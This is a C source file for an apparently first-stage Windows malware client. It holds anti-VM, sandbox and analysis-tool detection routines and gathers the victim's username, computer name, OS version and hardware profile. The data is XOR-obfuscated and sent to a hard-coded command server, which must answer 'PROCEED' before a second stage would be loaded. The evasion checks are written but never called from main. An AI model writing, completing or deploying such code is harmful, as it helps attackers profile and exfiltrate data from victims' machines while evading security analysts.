/*
 *
 * gcc -o stage1_client.exe stage1_client.c -lws2_32 -liphlpapi -lpsapi
 *
 * */


#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <intrin.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define SERVER_IP "192.168.1.100"
#define SERVER_PORT 443
#define BUFFER_SIZE 4096

typedef struct {
    DWORD ram_mb;
    DWORD cpu_cores;
    DWORD uptime_minutes;
    DWORD process_count;
    DWORD user_active;
    CHAR username[256];
    CHAR computer_name[256];
    CHAR os_version[256];
} SYSTEM_PROFILE;

// Anti-VM checks
BOOL check_vm_artifacts() {
    // Check CPU vendor for VM signatures
    int cpu_info[4];
    __cpuid(cpu_info, 0);
    char vendor[13];
    memcpy(vendor, &cpu_info[1], 4);
    memcpy(vendor + 4, &cpu_info[3], 4);
    memcpy(vendor + 8, &cpu_info[2], 4);
    vendor[12] = '\0';
    
    if (strstr(vendor, "VMware") || strstr(vendor, "Xen") || 
        strstr(vendor, "KVM") || strstr(vendor, "Microsoft Hv")) {
        return TRUE;
    }
    
    // Check for VM-specific processes
    if (FindWindowA("VBoxTrayToolWndClass", NULL) || 
        FindWindowA("VBoxTrayToolWnd", NULL)) {
        return TRUE;
    }
    
    return FALSE;
}

// Sandbox detection - check uptime
BOOL check_short_uptime() {
    DWORD uptime = GetTickCount() / 60000; // Convert to minutes
    return (uptime < 30); // Less than 30 minutes = likely sandbox
}

// Check for analysis tools
BOOL check_analysis_tools() {
    const char* tools[] = {
        "ollydbg", "wireshark", "procmon", "processhacker", 
        "idaq", "x32dbg", "x64dbg", "fiddler", "vboxservice"
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; i < sizeof(tools) / sizeof(tools[0]); i++) {
                if (strstr(pe.szExeFile, tools[i]) != NULL) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return FALSE;
}

// Check user activity (mouse movement, keyboard input)
BOOL check_user_activity() {
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    Sleep(1000);
    GetCursorPos(&pt2);
    
    // If mouse moved, likely real user
    return (pt1.x != pt2.x || pt1.y != pt2.y);
}

// Gather system information
SYSTEM_PROFILE gather_system_info() {
    SYSTEM_PROFILE profile = {0};
    
    // RAM size
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    profile.ram_mb = (DWORD)(memInfo.ullTotalPhys / (1024 * 1024));
    
    // CPU cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    profile.cpu_cores = sysInfo.dwNumberOfProcessors;
    
    // Uptime
    profile.uptime_minutes = GetTickCount() / 60000;
    
    // Process count
    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        profile.process_count = cbNeeded / sizeof(DWORD);
    }
    
    // User activity
    profile.user_active = check_user_activity();
    
    // Username and computer name
    DWORD size = sizeof(profile.username);
    GetUserNameA(profile.username, &size);
    size = sizeof(profile.computer_name);
    GetComputerNameA(profile.computer_name, &size);
    
    // OS version
    OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);
    sprintf_s(profile.os_version, sizeof(profile.os_version), 
              "%d.%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    
    return profile;
}

// Simple XOR encryption
void encrypt_data(char* data, size_t len, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Connect to server and send profile
BOOL send_profile_to_server(SYSTEM_PROFILE* profile) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    // Encrypt the profile data
    char buffer[sizeof(SYSTEM_PROFILE)];
    memcpy(buffer, profile, sizeof(SYSTEM_PROFILE));
    encrypt_data(buffer, sizeof(SYSTEM_PROFILE), "encryption_key");
    
    // Send encrypted profile
    int result = send(sock, buffer, sizeof(SYSTEM_PROFILE), 0);
    
    // Wait for server response
    char response[16];
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    
    closesocket(sock);
    WSACleanup();
    
    if (bytes_received > 0) {
        response[bytes_received] = '\0';
        return (strcmp(response, "PROCEED") == 0);
    }
    
    return FALSE;
}

// Main Stage 1 execution
int main() {
    
    // Gather system information
    SYSTEM_PROFILE profile = gather_system_info();
    
    // Send to server and wait for response
    if (send_profile_to_server(&profile)) {
        // Server said PROCEED - this is where you'd load Stage 2
        // For now, just indicate success
        return 1;
    }
    
    // Server said no or connection failed - clean exit
    return 0;
}
